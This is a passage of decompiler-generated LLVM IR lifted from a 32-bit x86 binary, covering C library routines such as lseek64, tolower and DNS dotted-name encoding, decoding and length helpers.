  uselistorder i32 %arg9, { 3, 1, 2, 0 }
  uselistorder i32 %arg8, { 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 1, 0, 2, 3 }
  uselistorder i32 %arg6, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_8054755, { 9, 8, 0, 10, 7, 6, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_805471b, { 1, 3, 0, 2, 4 }
  uselistorder label %dec_label_pc_80546d1, { 1, 0 }
  uselistorder label %dec_label_pc_80546b5, { 1, 0 }
  uselistorder label %dec_label_pc_8054678, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_805463f.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_8054665, { 1, 0 }
  uselistorder label %dec_label_pc_8054633, { 1, 0 }
  uselistorder label %dec_label_pc_805471b.outer, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054605, { 1, 0 }
  uselistorder label %dec_label_pc_80545ca, { 1, 0 }
  uselistorder label %dec_label_pc_8054521, { 1, 0 }
  uselistorder label %dec_label_pc_80544b1, { 1, 0 }
}

define i32 @__libc_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-20 = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_8054766 = load i32, i32* @ebx, align 4
  store i32 %v0_8054766, i32* %stack_var_-12, align 4
  %v2_805476e = ptrtoint i32* %stack_var_-20 to i32
  store i32 %v2_805476e, i32* %esi.global-to-local, align 4
  %v1_8054788 = call i32 @int80_syscall(i32 140)
  store i32 %v1_8054788, i32* %esi.global-to-local, align 4
  %tmp16 = icmp ult i32 %v1_8054788, -4095
  br i1 %tmp16, label %dec_label_pc_80547a2, label %dec_label_pc_8054794

dec_label_pc_8054794:                             ; preds = %entry
  %v1_8054794 = call i32 @__errno_location(i32 %arg3)
  %v0_8054799 = load i32, i32* %esi.global-to-local, align 4
  %v1_8054799 = sub i32 0, %v0_8054799
  %v2_805479b = inttoptr i32 %v1_8054794 to i32*
  store i32 %v1_8054799, i32* %v2_805479b, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_80547a6

dec_label_pc_80547a2:                             ; preds = %entry
  %v1_80547a2 = icmp eq i32 %v1_8054788, 0
  br i1 %v1_80547a2, label %dec_label_pc_80547ab, label %dec_label_pc_80547a6

dec_label_pc_80547a6:                             ; preds = %dec_label_pc_80547a2, %dec_label_pc_8054794
  %v0_80547a6 = phi i32 [ %v1_8054788, %dec_label_pc_80547a2 ], [ -1, %dec_label_pc_8054794 ]
  %v1_80547a8 = ashr i32 %v0_80547a6, 31
  br label %dec_label_pc_80547b3

dec_label_pc_80547ab:                             ; preds = %dec_label_pc_80547a2
  %v3_80547ab = load i32, i32* %stack_var_-20, align 4
  br label %dec_label_pc_80547b3

dec_label_pc_80547b3:                             ; preds = %dec_label_pc_80547a6, %dec_label_pc_80547ab
  %v0_80547b9 = phi i32 [ %v0_80547a6, %dec_label_pc_80547a6 ], [ %v3_80547ab, %dec_label_pc_80547ab ]
  %storemerge = phi i32 [ %v1_80547a8, %dec_label_pc_80547a6 ], [ %tmp, %dec_label_pc_80547ab ]
  store i32 %storemerge, i32* @edx, align 4
  %v2_80547b6 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_80547b6, i32* @ebx, align 4
  ret i32 %v0_80547b9

; uselistorder directives
  uselistorder i32 %v1_8054788, { 1, 2, 0, 3 }
  uselistorder i32 31, { 20, 15, 21, 27, 28, 22, 23, 11, 2, 3, 0, 1, 10, 26, 16, 17, 18, 6, 7, 4, 5, 12, 8, 9, 24, 25, 19, 13, 14 }
  uselistorder i32 (i32)* @__errno_location, { 53, 44, 71, 70, 69, 43, 42, 52, 51, 41, 26, 38, 50, 49, 19, 54, 25, 64, 14, 13, 12, 11, 10, 68, 9, 24, 23, 8, 22, 63, 62, 40, 39, 67, 66, 65, 61, 21, 20, 60, 18, 37, 48, 47, 46, 2, 32, 7, 15, 45, 1, 0, 59, 34, 33, 58, 30, 6, 17, 3, 29, 16, 57, 56, 36, 28, 27, 55, 5, 4, 72, 35, 31 }
  uselistorder i32 140, { 1, 0 }
  uselistorder label %dec_label_pc_80547b3, { 1, 0 }
}

define i32 @__GI_tolower(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @edx, align 4
  %v1_80547c0 = add i32 %arg1, 128
  %v6_80547cb = icmp ugt i32 %v1_80547c0, 383
  br i1 %v6_80547cb, label %dec_label_pc_80547d6, label %dec_label_pc_80547cd

dec_label_pc_80547cd:                             ; preds = %entry
  %v0_80547cd = load i32, i32* bitcast (i32** @global_var_805a6a0.178 to i32*), align 32
  %v2_80547d2 = mul i32 %arg1, 2
  %v3_80547d2 = add i32 %v0_80547cd, %v2_80547d2
  %v4_80547d2 = inttoptr i32 %v3_80547d2 to i16*
  %v5_80547d2 = load i16, i16* %v4_80547d2, align 2
  %v6_80547d2 = sext i16 %v5_80547d2 to i32
  store i32 %v6_80547d2, i32* @edx, align 4
  br label %dec_label_pc_80547d6

dec_label_pc_80547d6:                             ; preds = %entry, %dec_label_pc_80547cd
  %v0_80547d6 = phi i32 [ %arg1, %entry ], [ %v6_80547d2, %dec_label_pc_80547cd ]
  ret i32 %v0_80547d6

; uselistorder directives
  uselistorder i32 65536, { 1, 0, 2, 3, 4, 6, 5, 8, 7, 10, 9, 12, 11, 13, 14, 60, 63, 15, 62, 16, 17, 18, 19, 20, 23, 24, 22, 21, 25, 26, 27, 28, 31, 32, 30, 29, 33, 36, 35, 34, 37, 38, 39, 40, 41, 42, 43, 44, 46, 45, 47, 48, 51, 52, 53, 49, 54, 50, 56, 55, 57, 59, 58, 61 }
  uselistorder i32 128, { 17, 8, 10, 3, 9, 4, 5, 11, 0, 6, 7, 12, 13, 14, 15, 16, 2, 1, 18 }
  uselistorder label %dec_label_pc_80547d6, { 1, 0 }
}

define i32 @__encode_dotted(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %v0_80547dd = load i32, i32* @edi, align 4
  %v0_80547de = load i32, i32* @esi, align 4
  store i32 0, i32* %ebx.global-to-local, align 4
  %v4_80547e5 = ptrtoint i8* %arg1 to i32
  store i32 %v4_80547e5, i32* @edi, align 4
  %v1_80548446 = icmp eq i8* %arg1, null
  br i1 %v1_80548446, label %dec_label_pc_805484d, label %dec_label_pc_8054848.lr.ph

dec_label_pc_8054848.lr.ph:                       ; preds = %entry
  br label %dec_label_pc_8054848

dec_label_pc_80547eb:                             ; preds = %dec_label_pc_8054848
  %v5_80547f0 = call i32 @__GI_strchr(i8* %v1_8054848, i32 46)
  %v1_80547f8 = icmp eq i32 %v5_80547f0, 0
  br i1 %v1_80547f8, label %dec_label_pc_8054804, label %dec_label_pc_80547fe

dec_label_pc_80547fe:                             ; preds = %dec_label_pc_80547eb
  %v1_8054800 = load i32, i32* @edi, align 4
  %v2_8054800 = sub i32 %v5_80547f0, %v1_8054800
  br label %dec_label_pc_8054812

dec_label_pc_8054804:                             ; preds = %dec_label_pc_80547eb
  %v0_8054807 = load i32, i32* @edi, align 4
  %v5_8054807 = inttoptr i32 %v0_8054807 to i8*
  %v3_8054808 = call i32 @strlen(i8* %v5_8054807)
  br label %dec_label_pc_8054812

dec_label_pc_8054812:                             ; preds = %dec_label_pc_80547fe, %dec_label_pc_8054804
  %v0_8054825 = phi i32 [ %v3_8054808, %dec_label_pc_8054804 ], [ %v2_8054800, %dec_label_pc_80547fe ]
  store i32 %v0_8054825, i32* @esi, align 4
  %v1_8054812 = icmp eq i32 %v0_8054825, 0
  %v3_8054812 = trunc i32 %v0_8054825 to i8
  br i1 %v1_8054812, label %dec_label_pc_8054861, label %dec_label_pc_8054816

dec_label_pc_8054816:                             ; preds = %dec_label_pc_8054812
  %v1_805481a = load i32, i32* %ebx.global-to-local, align 4
  %v2_805481a = sub i32 %arg3, %v1_805481a
  %v1_805481c = add i32 %v2_805481a, -1
  %v7_805481d = icmp ult i32 %v0_8054825, %v1_805481c
  %v1_805481f = icmp eq i1 %v7_805481d, false
  br i1 %v1_805481f, label %dec_label_pc_8054861, label %dec_label_pc_8054821

dec_label_pc_8054821:                             ; preds = %dec_label_pc_8054816
  store i32 %arg2, i32* @edx, align 4
  %v4_8054827 = add i32 %v1_805481a, %arg2
  %v5_8054827 = inttoptr i32 %v4_8054827 to i8*
  store i8 %v3_8054812, i8* %v5_8054827, align 1
  %v0_805482a = load i32, i32* %ebx.global-to-local, align 4
  %v1_805482a = add i32 %v0_805482a, 1
  %v0_805482c = load i32, i32* @edx, align 4
  %v0_805482e = load i32, i32* @esi, align 4
  %v2_805482f = add i32 %v1_805482a, %v0_805482c
  %v0_8054831 = load i32, i32* @edi, align 4
  %v2_8054832 = add i32 %v0_805482e, %v1_805482a
  store i32 %v2_8054832, i32* %ebx.global-to-local, align 4
  %tmp31 = inttoptr i32 %v2_805482f to i16*
  %v7_8054835 = call i32 @memcpy(i16* %tmp31, i32 %v0_8054831, i32 %v0_805482e)
  %v1_8054841 = add i32 %v5_80547f0, 1
  br i1 %v1_80547f8, label %dec_label_pc_805484d, label %dec_label_pc_8054844

dec_label_pc_8054844:                             ; preds = %dec_label_pc_8054821
  store i32 %v1_8054841, i32* @edi, align 4
  %v1_8054844 = icmp eq i32 %v1_8054841, 0
  br i1 %v1_8054844, label %dec_label_pc_805484d, label %dec_label_pc_8054848

dec_label_pc_8054848:                             ; preds = %dec_label_pc_8054848.lr.ph, %dec_label_pc_8054844
  %v0_80547ef = phi i32 [ %v4_80547e5, %dec_label_pc_8054848.lr.ph ], [ %v1_8054841, %dec_label_pc_8054844 ]
  %v1_8054848 = inttoptr i32 %v0_80547ef to i8*
  %v2_8054848 = load i8, i8* %v1_8054848, align 1
  %v3_8054848 = icmp eq i8 %v2_8054848, 0
  %v1_805484b = icmp eq i1 %v3_8054848, false
  br i1 %v1_805484b, label %dec_label_pc_80547eb, label %dec_label_pc_805484d

dec_label_pc_805484d:                             ; preds = %dec_label_pc_8054844, %dec_label_pc_8054848, %dec_label_pc_8054821, %entry
  %tmp32 = icmp slt i32 %arg3, 1
  br i1 %tmp32, label %dec_label_pc_8054861, label %dec_label_pc_8054854

dec_label_pc_8054854:                             ; preds = %dec_label_pc_805484d
  %v1_8054858 = load i32, i32* %ebx.global-to-local, align 4
  %v2_8054858 = add i32 %v1_8054858, %arg2
  %v3_8054858 = inttoptr i32 %v2_8054858 to i8*
  store i8 0, i8* %v3_8054858, align 1
  %v0_805485c = load i32, i32* %ebx.global-to-local, align 4
  %v1_805485c = add i32 %v0_805485c, 1
  br label %dec_label_pc_8054864

dec_label_pc_8054861:                             ; preds = %dec_label_pc_8054816, %dec_label_pc_8054812, %dec_label_pc_805484d
  br label %dec_label_pc_8054864

dec_label_pc_8054864:                             ; preds = %dec_label_pc_8054854, %dec_label_pc_8054861
  %storemerge4 = phi i32 [ %v1_805485c, %dec_label_pc_8054854 ], [ -1, %dec_label_pc_8054861 ]
  store i32 %v0_80547de, i32* @esi, align 4
  store i32 %v0_80547dd, i32* @edi, align 4
  ret i32 %storemerge4

; uselistorder directives
  uselistorder i8* %v1_8054848, { 1, 0 }
  uselistorder i32 %v1_8054841, { 0, 2, 1 }
  uselistorder i32 %v0_805482e, { 1, 0 }
  uselistorder i32 %v5_80547f0, { 1, 0, 2 }
  uselistorder i32* %ebx.global-to-local, { 1, 2, 0, 3, 4, 5 }
  uselistorder i32 (i8*)* @strlen, { 2, 7, 6, 1, 0, 5, 4, 3, 8 }
  uselistorder i32 (i8*, i32)* @__GI_strchr, { 3, 4, 5, 6, 7, 8, 0, 1, 2 }
  uselistorder i32 46, { 1, 2, 0, 3 }
  uselistorder i8* null, { 4, 3, 2, 7, 0, 1, 6, 8, 9, 5, 10, 11, 12 }
  uselistorder label %dec_label_pc_8054864, { 1, 0 }
  uselistorder label %dec_label_pc_8054861, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805484d, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_8054848, { 1, 0 }
  uselistorder label %dec_label_pc_8054812, { 1, 0 }
}

define i32 @__decode_dotted(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %ebp.global-to-local = alloca i32, align 4
  %v0_805486e = load i32, i32* @esi, align 4
  %v4_8054873 = icmp eq i32 %arg1, 0
  store i32 %arg2, i32* @edx, align 4
  br i1 %v4_8054873, label %dec_label_pc_805493a, label %dec_label_pc_8054882

dec_label_pc_8054882:                             ; preds = %entry
  store i32 0, i32* %ebp.global-to-local, align 4
  store i32 0, i32* @ecx, align 4
  %v2_80549222541 = add i32 %arg2, %arg1
  %v3_80549222642 = inttoptr i32 %v2_80549222541 to i8*
  %v4_80549222743 = load i8, i8* %v3_80549222642, align 1
  %v1_80549262945 = icmp eq i8 %v4_80549222743, 0
  %v1_80549283046 = icmp eq i1 %v1_80549262945, false
  br i1 %v1_80549283046, label %dec_label_pc_8054890.lr.ph, label %dec_label_pc_805492e

dec_label_pc_8054890:                             ; preds = %dec_label_pc_8054890.lr.ph, %dec_label_pc_80548a9
  %v0_805489a = phi i32 [ %v0_805489a.pre, %dec_label_pc_8054890.lr.ph ], [ %v4_80548ba, %dec_label_pc_80548a9 ]
  %v8_805489037 = phi i1 [ %v8_80548903151, %dec_label_pc_8054890.lr.ph ], [ true, %dec_label_pc_80548a9 ]
  %v5_805492236.in = phi i8 [ %v5_80549222850.in, %dec_label_pc_8054890.lr.ph ], [ %v4_8054922, %dec_label_pc_80548a9 ]
  %stack_var_-17.135 = phi i8 [ %stack_var_-17.1.ph49, %dec_label_pc_8054890.lr.ph ], [ 0, %dec_label_pc_80548a9 ]
  %v0_805489734 = phi i32 [ %v0_8054897.ph47, %dec_label_pc_8054890.lr.ph ], [ %v2_80548c8, %dec_label_pc_80548a9 ]
  %v5_805492236 = zext i8 %v5_805492236.in to i32
  %v1_8054897 = add i32 %v0_805489734, 1
  store i32 %v1_8054897, i32* @esi, align 4
  %v3_805489a = select i1 %v8_805489037, i32 2, i32 1
  %v4_805489a = add i32 %v3_805489a, %v0_805489a
  store i32 %v4_805489a, i32* %ebp.global-to-local, align 4
  %v1_805489d = and i32 %v5_805492236, 192
  %v6_80548a2 = icmp eq i32 %v1_805489d, 192
  %v1_80548a7 = icmp eq i1 %v6_80548a2, false
  br i1 %v1_80548a7, label %dec_label_pc_80548cc, label %dec_label_pc_80548a9

dec_label_pc_80548a9:                             ; preds = %dec_label_pc_8054890
  %v2_80548b6 = add i32 %v1_8054897, %arg1
  %v3_80548b6 = inttoptr i32 %v2_80548b6 to i8*
  %v4_80548b6 = load i8, i8* %v3_80548b6, align 1
  %v5_80548b6 = zext i8 %v4_80548b6 to i32
  %v4_80548ba = add i32 %v3_805489a, %v4_805489a
  store i32 %v4_80548ba, i32* %ebp.global-to-local, align 4
  %v1_80548bd = mul nuw nsw i32 %v5_805492236, 256
  %v2_80548c0 = and i32 %v1_80548bd, 16128
  %v2_80548c8 = or i32 %v5_80548b6, %v2_80548c0
  store i32 %v2_80548c8, i32* @edx, align 4
  store i32 %v1_80548e9.ph48, i32* @ecx, align 4
  %v2_8054922 = add i32 %v2_80548c8, %arg1
  %v3_8054922 = inttoptr i32 %v2_8054922 to i8*
  %v4_8054922 = load i8, i8* %v3_8054922, align 1
  %v1_8054926 = icmp eq i8 %v4_8054922, 0
  %v1_8054928 = icmp eq i1 %v1_8054926, false
  br i1 %v1_8054928, label %dec_label_pc_8054890, label %dec_label_pc_805492e

dec_label_pc_80548cc:                             ; preds = %dec_label_pc_8054890
  %v2_80548cc = add i32 %v5_805492236, %v1_80548e9.ph48
  %v1_80548d1 = add i32 %v2_80548cc, 1
  store i32 %v1_80548d1, i32* @edi, align 4
  %v10_80548d2 = icmp ult i32 %v1_80548d1, %arg4
  %v1_80548da = icmp eq i1 %v10_80548d2, false
  br i1 %v1_80548da, label %dec_label_pc_805493a, label %dec_label_pc_80548dc

dec_label_pc_80548dc:                             ; preds = %dec_label_pc_80548cc
  %v2_80548e2 = add i32 %v1_8054897, %arg1
  %v2_80548e9 = add i32 %v1_80548e9.ph48, %arg3
  %v3_80548ec = inttoptr i32 %v2_80548e9 to i16*
  %v4_80548ec = call i32 @memcpy(i16* %v3_80548ec, i32 %v2_80548e2, i32 %v5_805492236)
  %v0_80548f8 = load i32, i32* %ebp.global-to-local, align 4
  %v0_8054901 = load i32, i32* @esi, align 4
  %v2_8054901 = add i32 %v0_8054901, %v5_805492236
  store i32 %v2_8054901, i32* @edx, align 4
  %v1_8054908 = icmp eq i1 %v8_805489037, false
  %v2_80548f8 = select i1 %v1_8054908, i32 %v5_805492236, i32 0
  %v4_8054908 = add i32 %v0_80548f8, %v2_80548f8
  store i32 %v4_8054908, i32* %ebp.global-to-local, align 4
  %v4_8054919 = add i32 %v2_80548cc, %arg3
  %v5_8054919 = inttoptr i32 %v4_8054919 to i8*
  store i8 46, i8* %v5_8054919, align 1
  %v0_805491c.pre = load i32, i32* @edi, align 4
  %v1_8054922.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805491c.pre, i32* @ecx, align 4
  %v2_805492225 = add i32 %v1_8054922.pre.pre, %arg1
  %v3_805492226 = inttoptr i32 %v2_805492225 to i8*
  %v4_805492227 = load i8, i8* %v3_805492226, align 1
  %v1_805492629 = icmp eq i8 %v4_805492227, 0
  %v1_805492830 = icmp eq i1 %v1_805492629, false
  %v8_805489031 = icmp eq i8 %stack_var_-17.135, 0
  %v0_805489a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805492830, label %dec_label_pc_8054890.lr.ph, label %dec_label_pc_805492e

dec_label_pc_8054890.lr.ph:                       ; preds = %dec_label_pc_80548dc, %dec_label_pc_8054882
  %v0_805489a.pre = phi i32 [ 0, %dec_label_pc_8054882 ], [ %v0_805489a.pre.pre, %dec_label_pc_80548dc ]
  %v8_80548903151 = phi i1 [ false, %dec_label_pc_8054882 ], [ %v8_805489031, %dec_label_pc_80548dc ]
  %v5_80549222850.in = phi i8 [ %v4_80549222743, %dec_label_pc_8054882 ], [ %v4_805492227, %dec_label_pc_80548dc ]
  %stack_var_-17.1.ph49 = phi i8 [ 1, %dec_label_pc_8054882 ], [ %stack_var_-17.135, %dec_label_pc_80548dc ]
  %v1_80548e9.ph48 = phi i32 [ 0, %dec_label_pc_8054882 ], [ %v0_805491c.pre, %dec_label_pc_80548dc ]
  %v0_8054897.ph47 = phi i32 [ %arg2, %dec_label_pc_8054882 ], [ %v1_8054922.pre.pre, %dec_label_pc_80548dc ]
  br label %dec_label_pc_8054890

dec_label_pc_805492e:                             ; preds = %dec_label_pc_80548dc, %dec_label_pc_80548a9, %dec_label_pc_8054882
  %v0_8054933 = phi i32 [ 0, %dec_label_pc_8054882 ], [ %v4_80548ba, %dec_label_pc_80548a9 ], [ %v0_805489a.pre.pre, %dec_label_pc_80548dc ]
  %v8_8054890.lcssa = phi i1 [ false, %dec_label_pc_8054882 ], [ true, %dec_label_pc_80548a9 ], [ %v8_805489031, %dec_label_pc_80548dc ]
  %v2_8054935 = zext i1 %v8_8054890.lcssa to i32
  %v3_8054935 = add i32 %v0_8054933, 1
  %v4_8054935 = add i32 %v3_8054935, %v2_8054935
  br label %dec_label_pc_805493d

dec_label_pc_805493a:                             ; preds = %dec_label_pc_80548cc, %entry
  br label %dec_label_pc_805493d

dec_label_pc_805493d:                             ; preds = %dec_label_pc_805492e, %dec_label_pc_805493a
  %storemerge = phi i32 [ %v4_8054935, %dec_label_pc_805492e ], [ -1, %dec_label_pc_805493a ]
  store i32 %v0_805486e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80548e9.ph48, { 2, 1, 0 }
  uselistorder i8 %v4_8054922, { 1, 0 }
  uselistorder i32 %v2_80548c8, { 0, 2, 1 }
  uselistorder i32 %v4_80548ba, { 0, 2, 1 }
  uselistorder i32 %v5_805492236, { 2, 4, 1, 3, 5, 0 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 3, 2, 4, 5 }
  uselistorder i8 1, { 3, 14, 17, 6, 0, 16, 12, 1, 10, 11, 7, 8, 4, 5, 13, 2, 15, 9 }
  uselistorder i8 46, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, { 3, 173, 174, 21, 175, 176, 177, 20, 178, 179, 180, 2, 0, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 29, 5, 4, 30, 31, 32, 33, 34, 37, 35, 36, 196, 7, 197, 8, 198, 199, 6, 200, 201, 202, 203, 208, 209, 1, 204, 205, 206, 207, 210, 211, 212, 213, 106, 9, 107, 108, 109, 214, 215, 223, 224, 225, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 94, 95, 96, 97, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 10, 121, 122, 123, 124, 125, 126, 127, 329, 330, 331, 11, 332, 333, 336, 337, 286, 287, 288, 45, 46, 47, 338, 339, 340, 355, 48, 12, 49, 50, 38, 39, 40, 41, 42, 43, 44, 164, 165, 166, 167, 168, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 51, 52, 53, 54, 55, 56, 57, 311, 312, 313, 314, 315, 316, 317, 318, 13, 319, 320, 321, 322, 323, 256, 257, 14, 258, 259, 260, 261, 262, 263, 264, 275, 276, 277, 278, 279, 128, 129, 15, 130, 353, 354, 131, 132, 133, 16, 234, 235, 226, 227, 228, 229, 230, 231, 232, 233, 58, 59, 60, 236, 237, 238, 134, 135, 136, 137, 138, 139, 140, 144, 145, 146, 147, 148, 149, 150, 151, 152, 153, 154, 17, 155, 26, 27, 28, 141, 18, 142, 143, 349, 350, 351, 352, 239, 240, 241, 242, 243, 244, 156, 157, 158, 159, 216, 217, 218, 219, 220, 221, 222, 334, 335, 169, 170, 284, 285, 61, 62, 63, 289, 290, 346, 347, 348, 64, 19, 65, 66, 67, 68, 291, 292, 69, 70, 71, 341, 342, 343, 344, 345, 72, 73, 74, 77, 75, 76, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 98, 99, 100, 101, 102, 103, 104, 105, 160, 161, 162, 163, 22, 23, 24, 25, 171, 172, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 280, 281, 282, 283, 293, 294, 295, 324, 325, 326, 327, 328 }
  uselistorder i32 256, { 5, 6, 7, 8, 9, 47, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 46, 21, 22, 23, 24, 25, 0, 1, 26, 2, 48, 27, 28, 54, 29, 30, 4, 51, 52, 3, 31, 32, 33, 34, 49, 35, 36, 37, 38, 39, 40, 41, 42, 50, 55, 43, 53, 44, 45 }
  uselistorder i1 true, { 1, 3, 7, 8, 9, 10, 11, 12, 2, 5, 6, 4, 0 }
  uselistorder i32* @edx, { 4, 150, 151, 152, 153, 154, 155, 156, 17, 160, 158, 159, 161, 162, 163, 164, 165, 166, 167, 45, 49, 46, 47, 48, 168, 169, 170, 171, 172, 173, 174, 181, 175, 176, 177, 178, 179, 180, 1, 18, 92, 101, 102, 182, 103, 104, 105, 106, 107, 196, 183, 184, 185, 200, 201, 202, 203, 213, 5, 2, 19, 93, 108, 109, 186, 187, 6, 188, 189, 190, 191, 110, 111, 112, 113, 114, 115, 282, 283, 284, 285, 7, 286, 287, 219, 220, 52, 50, 221, 290, 291, 298, 297, 82, 51, 224, 225, 8, 226, 227, 228, 229, 230, 231, 232, 233, 234, 235, 236, 237, 238, 9, 239, 240, 222, 223, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 10, 68, 69, 70, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 11, 266, 267, 268, 269, 270, 293, 71, 204, 205, 207, 0, 157, 206, 81, 116, 192, 193, 194, 72, 195, 117, 118, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 16, 136, 137, 119, 138, 12, 139, 140, 142, 13, 143, 144, 145, 146, 147, 44, 14, 141, 289, 197, 198, 199, 15, 148, 214, 215, 288, 149, 292, 212, 294, 281, 73, 216, 217, 74, 209, 218, 75, 295, 296, 76, 77, 78, 79, 80, 83, 84, 85, 86, 87, 88, 89, 90, 91, 94, 95, 96, 97, 98, 99, 100, 20, 21, 22, 24, 25, 23, 26, 27, 28, 29, 30, 32, 31, 33, 34, 35, 37, 36, 38, 39, 40, 41, 42, 43, 208, 210, 211, 271, 272, 273, 274, 276, 280, 275, 278, 279, 3, 277, 299 }
  uselistorder i32* @esi, {}
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_805493d, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8054956 = icmp eq i32 %arg1, 0
  br i1 %v1_8054956, label %dec_label_pc_8054985, label %dec_label_pc_8054976.preheader

dec_label_pc_8054976.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805497610 = add i32 %arg2, %arg1
  %v3_805497611 = inttoptr i32 %v2_805497610 to i8*
  %v4_805497612 = load i8, i8* %v3_805497611, align 1
  %v1_805497a14 = add i32 %arg2, 1
  %v1_805497d15 = icmp eq i8 %v4_805497612, 0
  %v1_805497f16 = icmp eq i1 %v1_805497d15, false
  br i1 %v1_805497f16, label %dec_label_pc_8054965, label %dec_label_pc_8054981

dec_label_pc_805495c:                             ; preds = %dec_label_pc_8054965
  %v1_805495c = add i32 %v0_805495c17, 2
  br label %dec_label_pc_8054981

dec_label_pc_8054965:                             ; preds = %dec_label_pc_8054976.preheader, %dec_label_pc_8054976
  %v1_805497a19 = phi i32 [ %v1_805497a, %dec_label_pc_8054976 ], [ %v1_805497a14, %dec_label_pc_8054976.preheader ]
  %v5_805497618.in = phi i8 [ %v4_8054976, %dec_label_pc_8054976 ], [ %v4_805497612, %dec_label_pc_8054976.preheader ]
  %v0_805495c17 = phi i32 [ %v2_8054973, %dec_label_pc_8054976 ], [ %arg2, %dec_label_pc_8054976.preheader ]
  %v5_805497618 = zext i8 %v5_805497618.in to i32
  %v1_8054967 = and i32 %v5_805497618, 192
  %v6_805496c = icmp eq i32 %v1_8054967, 192
  %v2_8054973 = add i32 %v5_805497618, %v1_805497a19
  br i1 %v6_805496c, label %dec_label_pc_805495c, label %dec_label_pc_8054976

dec_label_pc_8054976:                             ; preds = %dec_label_pc_8054965
  store i32 %v2_8054973, i32* @ecx, align 4
  %v2_8054976 = add i32 %v2_8054973, %arg1
  %v3_8054976 = inttoptr i32 %v2_8054976 to i8*
  %v4_8054976 = load i8, i8* %v3_8054976, align 1
  %v1_805497a = add i32 %v2_8054973, 1
  %v1_805497d = icmp eq i8 %v4_8054976, 0
  %v1_805497f = icmp eq i1 %v1_805497d, false
  br i1 %v1_805497f, label %dec_label_pc_8054965, label %dec_label_pc_8054981

dec_label_pc_8054981:                             ; preds = %dec_label_pc_8054976.preheader, %dec_label_pc_8054976, %dec_label_pc_805495c
  %v0_8054981 = phi i32 [ %v1_805495c, %dec_label_pc_805495c ], [ %v1_805497a14, %dec_label_pc_8054976.preheader ], [ %v1_805497a, %dec_label_pc_8054976 ]
  %v2_8054983 = sub i32 %v0_8054981, %arg2
  br label %dec_label_pc_8054985

dec_label_pc_8054985:                             ; preds = %entry, %dec_label_pc_8054981
  %v0_8054988 = phi i32 [ -1, %entry ], [ %v2_8054983, %dec_label_pc_8054981 ]
  ret i32 %v0_8054988

; uselistorder directives
  uselistorder i8 %v4_8054976, { 1, 0 }
  uselistorder i32 %v2_8054973, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 2, 1, 3 }
  uselistorder i32 2, { 133, 48, 134, 76, 138, 139, 45, 46, 47, 0, 1, 135, 140, 141, 142, 111, 143, 144, 145, 146, 147, 148, 117, 2, 118, 119, 52, 149, 150, 3, 77, 53, 123, 124, 72, 151, 152, 153, 155, 112, 168, 169, 58, 125, 126, 73, 8, 9, 62, 63, 176, 59, 110, 7, 78, 104, 79, 105, 80, 106, 54, 10, 122, 50, 81, 11, 12, 64, 13, 14, 120, 15, 16, 17, 65, 171, 18, 19, 74, 20, 156, 157, 158, 159, 4, 66, 166, 167, 136, 137, 162, 163, 55, 56, 57, 21, 177, 67, 5, 6, 127, 128, 61, 22, 23, 129, 24, 130, 25, 68, 131, 132, 26, 154, 170, 175, 75, 27, 121, 28, 82, 85, 83, 84, 86, 29, 30, 31, 32, 33, 34, 35, 36, 37, 69, 38, 39, 40, 41, 42, 43, 87, 107, 88, 70, 89, 108, 90, 91, 109, 60, 92, 93, 94, 113, 114, 115, 116, 95, 96, 97, 98, 160, 49, 161, 164, 99, 51, 165, 100, 101, 102, 174, 71, 172, 44, 173, 103 }
